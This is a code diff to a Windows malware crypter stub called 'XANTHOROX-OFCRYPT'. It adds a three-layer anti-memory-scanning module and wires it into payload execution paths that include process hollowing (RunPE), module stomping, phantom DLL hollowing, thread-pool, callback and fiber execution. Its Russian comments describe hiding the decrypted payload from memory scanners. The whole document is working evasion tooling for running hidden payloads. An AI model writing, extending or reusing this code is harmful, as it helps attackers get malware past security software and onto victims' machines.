@@ -37,6 +37,7 @@
 #include "NeuroDecrypt.h"
 #include "DarknetDecrypt.h"
 #include "VoidDecrypt.h"
+#include "AntiMemScan.h"
 
 // ═══════════════════════════════════════════════════════════════
 //  XANTHOROX-OFCRYPT STUB | CONFIGURATION BLOCK
@@ -337,43 +338,55 @@ int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLi
     }
 
 
-    // ── Step 8b: Guard Page Shield (L14) ──
-    // After decryption, install guard pages to protect payload from memory scanners.
-    // If a scanner touches the guarded region, payload auto-re-encrypts.
-    if (GlobalConfig.bGuardPage) {
+    // ── Step 8b: Anti-Memory Scanning (L14 + L16) ──
+    // Трёхуровневая защита от сканеров памяти:
+    //   Layer 1: Phantom DLL Backing (MEM_IMAGE) — активируется при выполнении
+    //   Layer 2: Thread Origin Normalization — активируется при выполнении
+    //   Layer 3: Guard Page + XOR ре-шифрация — активируется сейчас
+    if (GlobalConfig.bAntiMemScan) {
+        AntiMemScan::Enable(EncryptedPayload, decryptSize, finalKey, sizeof(finalKey));
+    }
+    else if (GlobalConfig.bGuardPage) {
         GuardPage::Install(EncryptedPayload, decryptSize, finalKey, sizeof(finalKey));
     }
 
     // ── Step 9: Execute Payload ──
     if (GlobalConfig.bPhantomDLL) {
         // L16: Phantom DLL Hollowing — execute from signed DLL memory
-        if (GlobalConfig.bGuardPage) GuardPage::Uninstall();
+        if (GlobalConfig.bAntiMemScan) AntiMemScan::Disable();
+        else if (GlobalConfig.bGuardPage) GuardPage::Uninstall();
         Phantom::Execute(EncryptedPayload, decryptSize);
     }
     else if (GlobalConfig.bThreadPool) {
         // L12: Thread Pool Execution — execute via TpAllocWork
-        if (GlobalConfig.bGuardPage) GuardPage::Uninstall();
+        if (GlobalConfig.bAntiMemScan) AntiMemScan::Disable();
+        else if (GlobalConfig.bGuardPage) GuardPage::Uninstall();
         ThreadPool::Execute(EncryptedPayload, decryptSize);
     }
     else if (GlobalConfig.bModuleStomp) {
-        if (GlobalConfig.bGuardPage) GuardPage::Uninstall();
+        if (GlobalConfig.bAntiMemScan) AntiMemScan::Disable();
+        else if (GlobalConfig.bGuardPage) GuardPage::Uninstall();
         GodMode::Internal::ModuleStomp(EncryptedPayload, decryptSize);
     }
     else if (GlobalConfig.bRunPE) {
-        if (GlobalConfig.bGuardPage) GuardPage::Uninstall();
+        if (GlobalConfig.bAntiMemScan) AntiMemScan::Disable();
+        else if (GlobalConfig.bGuardPage) GuardPage::Uninstall();
         GodMode::ExecutePayload(EncryptedPayload, decryptSize, false, true);
     }
     else if (GlobalConfig.bCallbackDiv) {
         // Callback Diversification — use callback proxy
-        if (GlobalConfig.bGuardPage) GuardPage::Uninstall();
+        if (GlobalConfig.bAntiMemScan) AntiMemScan::Disable();
+        else if (GlobalConfig.bGuardPage) GuardPage::Uninstall();
         GodMode::Internal::CallbackProxy(EncryptedPayload, decryptSize);
     }
     else if (GlobalConfig.bFibers) {
-        if (GlobalConfig.bGuardPage) GuardPage::Uninstall();
+        if (GlobalConfig.bAntiMemScan) AntiMemScan::Disable();
+        else if (GlobalConfig.bGuardPage) GuardPage::Uninstall();
         GodMode::ExecutePayload(EncryptedPayload, decryptSize, true, false);
     }
     else {
-        if (GlobalConfig.bGuardPage) GuardPage::Uninstall();
+        if (GlobalConfig.bAntiMemScan) AntiMemScan::Disable();
+        else if (GlobalConfig.bGuardPage) GuardPage::Uninstall();
         GodMode::ExecutePayload(EncryptedPayload, decryptSize, false, false);
     }
 
